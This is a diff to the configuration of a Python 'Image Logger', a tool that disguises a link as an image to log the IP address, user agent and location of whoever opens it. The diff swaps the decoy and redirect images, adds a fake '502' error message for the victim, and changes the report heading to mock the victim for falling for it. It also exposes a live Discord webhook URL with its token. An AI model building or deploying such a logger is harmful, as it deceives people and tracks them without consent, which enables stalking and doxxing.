@@ -13,12 +13,12 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1350348163634036848/8PqHHmoZgErdvET8V2_O5abJAUg1cJz47lM2S-2KtfsSnwZuMxRD-Ags4e24NMeSejhW",
-    "image": "https://cdn.prod.website-files.com/5e6a84f09b62b91e6157c149/5e6a8dd88f50f50f9ef987f1_5e37b64f7c077b4c62ef76a2_shutterstock_1363873922.jpeg", # You can also have a custom image by using a URL argument
+    "image": "https://www.techslang.com/wp-content/uploads/2020/06/Canva-boy-hacker-laptop-looks-1024x536.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "CaptainHook", # Set this to the name you want the webhook to have
+    "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x009900FF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "Coding Error", # Message to show
+        "message": "Sorry, image cant be accessed right now: Error Code 502", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://www.techslang.com/wp-content/uploads/2020/06/Canva-boy-hacker-laptop-looks-1024x536.jpg" # Link to the webpage to redirect to 
+        "page": "https://iheartcraftythings.com/wp-content/uploads/2021/11/6-108.jpg" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -146,7 +146,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**Logged**
+            "description": f"""**SOMEONE ACTUALLY FELL FOR IT 😂🤣🤦‍♂️**
 
 **Endpoint:** `{endpoint}`
             
